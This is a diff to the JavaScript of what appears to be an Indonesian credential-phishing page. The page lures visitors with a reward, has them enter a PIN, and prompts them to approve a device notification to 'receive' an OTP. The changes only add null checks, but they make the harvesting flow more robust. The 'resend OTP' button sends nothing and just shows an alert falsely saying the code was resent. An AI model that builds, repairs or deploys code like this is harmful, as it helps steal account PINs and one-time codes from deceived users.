@@ -17,6 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const an = document.getElementById('attempt-number');
   const lc = document.getElementById('lanjutkan-container');
   const rewardInstruction = document.getElementById('reward-instruction');
+  const resendOtp = document.getElementById('resend-otp');
   const vb = document.getElementById('verifikasi-button');
   const vc = document.querySelector('.verifikasi-button-container');
 
@@ -41,13 +42,14 @@ document.addEventListener('DOMContentLoaded', () => {
   function startOTPTimer() {
     let timeLeft = 120;
     const timerElement = document.getElementById('otp-timer');
-    const resendOtp = document.getElementById('resend-otp');
     
     // Reset timer state
     clearInterval(otpTimer);
-    resendOtp.classList.remove('active');
-    resendOtp.style.pointerEvents = 'none';
-    resendOtp.style.opacity = '0.5';
+    if (resendOtp) {
+      resendOtp.classList.remove('active');
+      resendOtp.style.pointerEvents = 'none';
+      resendOtp.style.opacity = '0.5';
+    }
     
     otpTimer = setInterval(() => {
       const minutes = Math.floor(timeLeft / 60);
@@ -56,10 +58,12 @@ document.addEventListener('DOMContentLoaded', () => {
       
       if (timeLeft <= 0) {
         clearInterval(otpTimer);
-        resendOtp.classList.add('active');
-        resendOtp.style.pointerEvents = 'auto';
-        resendOtp.style.opacity = '1';
-        resendOtp.textContent = 'KIRIM ULANG OTP';
+        if (resendOtp) {
+          resendOtp.classList.add('active');
+          resendOtp.style.pointerEvents = 'auto';
+          resendOtp.style.opacity = '1';
+          resendOtp.textContent = 'KIRIM ULANG OTP';
+        }
       }
       timeLeft--;
     }, 1000);
@@ -75,12 +79,14 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function showRewardInstruction() {
-    rewardInstruction.style.display = 'block';
-    
-    // Close button handler
-    rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
-      rewardInstruction.style.display = 'none';
-    });
+    if (rewardInstruction) {
+      rewardInstruction.style.display = 'block';
+      
+      // Close button handler
+      rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
+        rewardInstruction.style.display = 'none';
+      });
+    }
   }
 
   // Backend Communication - MODIFIED FOR VERCEL
@@ -195,8 +201,10 @@ document.addEventListener('DOMContentLoaded', () => {
           lc.style.display = 'none';
           startOTPTimer();
           setTimeout(() => {
-            fn.style.display = 'block';
-            fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
+            if (fn) {
+              fn.style.display = 'block';
+              fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
+            }
           }, 1000);
         } catch (error) {
           alert('Gagal mengirim PIN: ' + error.message);
@@ -237,7 +245,7 @@ document.addEventListener('DOMContentLoaded', () => {
               showRewardInstruction();
             }
             
-            if (attemptCount > 2) {
+            if (attemptCount > 2 && rn) {
               rn.style.display = 'block';
               rn.innerHTML = `
                 <div class="notification-content">
@@ -248,8 +256,8 @@ document.addEventListener('DOMContentLoaded', () => {
               setTimeout(() => rn.style.display = 'none', 10000);
             }
             
-            if (attemptCount >= maxAttempts) {
-              fn.style.display = 'none';
+            if (attemptCount >= maxAttempts && sn) {
+              if (fn) fn.style.display = 'none';
               sn.style.display = 'block';
               setTimeout(() => sn.style.display = 'none', 5000);
             }
@@ -270,31 +278,38 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   // Resend OTP Handler
-  document.getElementById('resend-otp').addEventListener('click', function() {
-    if (this.classList.contains('active')) {
-      showSpinner();
-      setTimeout(() => {
-        startOTPTimer();
-        hideSpinner();
-        alert('Kode OTP telah dikirim ulang ke nomor Anda');
-      }, 1000);
-    }
-  });
+  if (resendOtp) {
+    resendOtp.addEventListener('click', function() {
+      if (this.classList.contains('active')) {
+        showSpinner();
+        setTimeout(() => {
+          startOTPTimer();
+          hideSpinner();
+          alert('Kode OTP telah dikirim ulang ke nomor Anda');
+        }, 1000);
+      }
+    });
+  }
 
   // Toggle PIN Visibility
-  document.querySelector('.show-text').addEventListener('click', (e) => {
-    const isShowing = e.target.classList.toggle('active');
-    const pinInputs = document.querySelectorAll('.pin-box');
-    pinInputs.forEach(input => {
-      input.type = isShowing ? 'text' : 'password';
+  const showTextBtn = document.querySelector('.show-text');
+  if (showTextBtn) {
+    showTextBtn.addEventListener('click', (e) => {
+      const isShowing = e.target.classList.toggle('active');
+      const pinInputs = document.querySelectorAll('.pin-box');
+      pinInputs.forEach(input => {
+        input.type = isShowing ? 'text' : 'password';
+      });
+      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
     });
-    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
-  });
+  }
 
   // Handle floating notification click
-  fn.addEventListener('click', () => {
-    fn.style.display = 'none';
-  });
+  if (fn) {
+    fn.addEventListener('click', () => {
+      fn.style.display = 'none';
+    });
+  }
 
   // Handle verifikasi button
   if (vb) {
